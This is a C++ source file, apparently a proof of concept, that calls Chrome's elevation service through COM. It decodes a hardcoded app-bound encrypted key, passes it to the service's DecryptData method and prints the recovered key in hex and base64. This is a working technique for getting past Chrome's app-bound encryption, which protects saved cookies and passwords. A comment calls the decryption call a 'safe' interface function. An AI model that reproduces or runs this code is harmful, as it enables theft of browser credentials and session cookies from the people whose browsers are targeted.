#include <windows.h>
#include <objbase.h>
#include <iostream>

// 1. Define the Interface ID (IID) and Class ID (CLSID) constants
// using standard Windows GUID structures.
// These match the IDs used by the service's COM interface.
const CLSID CLSID_ChromeElevator = {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}};
const IID IID_IElevator = {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}}; // Fixed layout structure for GUID matching
const IID IID_v2 =  {0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}}; // version 2 of the interface
// 2. Re-declare the specific interface structure
// The midl_interface or __declspec(uuid(...)) attaches the GUID to the struct name for __uuidof()
struct __declspec(uuid("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")) IElevator : public IUnknown {
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
        const WCHAR *crx_path,
        const WCHAR *browser_appid,
        DWORD *last_error) = 0;

    virtual HRESULT STDMETHODCALLTYPE EncryptData(
        int protection_level,
        const BSTR plaintext,
        BSTR *ciphertext,
        DWORD *last_error) = 0;

    virtual HRESULT STDMETHODCALLTYPE DecryptData(
        const BSTR ciphertext,
        BSTR *plaintext,
        DWORD *last_error) = 0;
};

int wmain() {
    // 3. Initialize the COM library for the current thread
    // This is required before calling any Co* functions like CoCreateInstance
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        std::wcerr << L"Failed to initialize COM library. HRESULT: 0x" << std::hex << hr << std::endl;
        return 1;
    }

    std::wcout << L"COM Library Initialized." << std::endl;
    IElevator* pElevator = nullptr;

    // 4. Call CoCreateInstance
    // This looks up the CLSID in the registry and attempts to spin up or bind to the server
    // hr = CoCreateInstance(
    //     CLSID_ChromeElevator,
    //     nullptr,
    //     CLSCTX_LOCAL_SERVER, // Out-of-process local server (.exe)
    //     __uuidof(IElevator),
    //     (void**)&pElevator
    // );

    hr = CoCreateInstance(CLSID_ChromeElevator, nullptr, CLSCTX_LOCAL_SERVER, IID_v2, (void**)&pElevator);


    char* app_bound_encrypted_key="QVBQQgEAAADQjJ3fARXREYx6AMBPwpfrAQAAAEIFPa64usdIp89Z90A0TTEQAAAAHAAAAEcAbwBvAGcAbABlACAAQwBoAHIAbwBtAGUAAAAQZgAAAAEAACAAAABZWpeZnUMaCyvtPE8F05XH2gtbNl/iiVuXi6hZ/hTWRQAAAAAOgAAAAAIAACAAAAAdEw5TmyVCJofp2C41boXuqgADRXla1Vwy9QOjt/ml+pABAADUY9BwAllug/UGqFvS/bjIe8GWzqIfefMlIiq/dZtytkgnffhY0ZeAYx6taYQCr8yJ8I+LDFdVm39bZ/6dza5V5MVfqmpyJ1IrQh3UJUm1r5pvdF6d52SUOT6gGMhnmg+wc138yaxciwEz2MP6NRjTaAeV8tOWSBXrJIYx3nBudQKrKez2REUzttj43WcieOqTjS+GfrN9LE3KOkMNJKX5tk8xAKQAdXH9oqlkIganj7qEp8tqYv+qqhVUtRDKLfaCu94aFbR3hkUl14n4+DKq5+i+zFAk4xG9EInRbZA4bJd3sYWM2h3gFy1Pu6/WNaw23qHM0XHB/aoDHEzET3zDeiKXwyrFVCFX0Hufri8SEcvF9O81PI3KIp3lT3J5mRpeEF2X910uFY8eSL+NRzs8QPRAS2LsXRyCpn1wvG7a+1VbKyaxB90Si6KFyk6ovIfSseKwZxe+kQPF6FRpQ5hacogkUitSn/nhAqSH0d2TVJMTvFXgZHfYdFtL3PtxoPH7BVDDx6zvAQkKJWt2Y98tQAAAAIx7ZO7xAS+e00GJcpSSZ8mnShIuEEvJ4Pq6AkQYiznIbrLeAlTLmbZ5TrRQZ3XbyhEwOhSKRKVqhRdbOgDCIP0=";

    if (SUCCEEDED(hr)) {
        DWORD encKeySize = 0;
        CryptStringToBinaryA(app_bound_encrypted_key, 0, CRYPT_STRING_BASE64, nullptr, &encKeySize, nullptr, nullptr);
        if (encKeySize < 5) {
            // Get last error
            DWORD err = GetLastError();
            std::wcerr << L"Failed to determine the size of the encrypted key, size=" << encKeySize << L", error=0x" << std::hex << err << std::endl;
            return 1;
        }

        BYTE* data = new BYTE[encKeySize];
        CryptStringToBinaryA(app_bound_encrypted_key, 0, CRYPT_STRING_BASE64, data, &encKeySize, nullptr, nullptr);

        BSTR bstrEnc = SysAllocStringByteLen((const char *)(data + 4), (UINT)(encKeySize - 4));
        BSTR bstrPlain = nullptr;
        DWORD comErr = 0;
        HRESULT hr = E_FAIL;
        std::wcout << L"Successfully instantiated COM interface!" << std::endl;
        CoSetProxyBlanket(pElevator, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL,
                            RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
        // Perform safe interface functions here...
        hr = pElevator->DecryptData(bstrEnc, &bstrPlain, &comErr);

        if (FAILED(hr)) {
            std::wcerr << L"Decryption failed. HRESULT: 0x" << std::hex << hr << ", COM error: " << comErr << std::endl;
        } else {
            std::wcout << L"Decryption succeeded." << std::endl;
        }

        if (!bstrPlain) {
            std::wcerr << L"Decrypted data is null." << std::endl;
        }

        UINT len = SysStringByteLen(bstrPlain);
        std::wcout << L"Decrypted data length: " << len << std::endl;
        std::wcout << L"Decrypted data (hex): ";
        for (UINT i = 0; i < len; ++i) {
            std::wcout << std::hex << static_cast<int>(reinterpret_cast<BYTE*>(bstrPlain)[i]) << L" ";
        }
        std::wcout << std::endl;

        // Convert to base64
        std::wstring b64Plain;
        if (bstrPlain) {
            int plainLen = SysStringByteLen(bstrPlain);
            BYTE* plainData = reinterpret_cast<BYTE*>(bstrPlain);
            DWORD b64Len = 0;
            CryptBinaryToStringW(plainData, plainLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &b64Len);
            if (b64Len > 0) {
                b64Plain.resize(b64Len);
                CryptBinaryToStringW(plainData, plainLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, b64Plain.data(), &b64Len);
            }
        }

        std::wstring hexPlain;
        for (UINT i = 0; i < len; ++i) {
            wchar_t buf[3];
            swprintf(buf, 3, L"%02x", static_cast<int>(reinterpret_cast<BYTE*>(bstrPlain)[i]));
            hexPlain += buf;
        }
        std::wcout << L"Decrypted data (hex string): " << (hexPlain.empty() ? L"null" : hexPlain) << std::endl;
        std::wcout << L"Decrypted data (base64): " << (b64Plain.empty() ? L"null" : b64Plain) << std::endl;

        SysFreeString(bstrEnc);
        SysFreeString(bstrPlain);
        delete[] data;
        // 5. Clean up the interface pointer when done
        pElevator->Release();
    } else {
        // Expected behavior if not running from the verified browser binary path: 
        // Windows will return REGDB_E_CLASSNOTREG (0x80040154) if unregistered,
        // or E_ACCESSDENIED (0x80070005) if blocked by path/permission rules.
        std::wcerr << L"CoCreateInstance failed or Access Denied. HRESULT: 0x" << std::hex << hr << std::endl;
    }

    // 6. Balance the CoInitialize call before exiting
    CoUninitialize();
    return 0;
}
